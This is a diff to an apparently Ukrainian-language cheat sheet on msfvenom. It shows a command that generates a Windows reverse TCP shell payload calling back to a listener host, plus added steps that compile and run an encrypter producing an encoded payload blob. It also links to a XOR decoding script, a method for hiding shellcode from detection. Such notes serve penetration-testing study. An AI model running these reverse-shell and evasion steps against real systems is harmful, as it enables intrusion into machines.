@@ -40,6 +40,12 @@ XOR encoder [xor.cs](https://github.com/Zavada-Nazarii/usefulCommands/tree/maste
 ```
 msfvenom LHOST=192.168.1.1 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
 ```
+```
+C:\> csc.exe Encrypter.cs
+C:\> .\Encrypter.exe
+qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
+```
+XOR decoding [xor_decoding.cs](https://github.com/Zavada-Nazarii/usefulCommands/tree/master/scripts//msfvenom/xor_decoding.cs)
 
 2. **-f**  
    Вказує формат файлу, який буде створений. Може бути elf, exe, asp, php, і багато інших.  
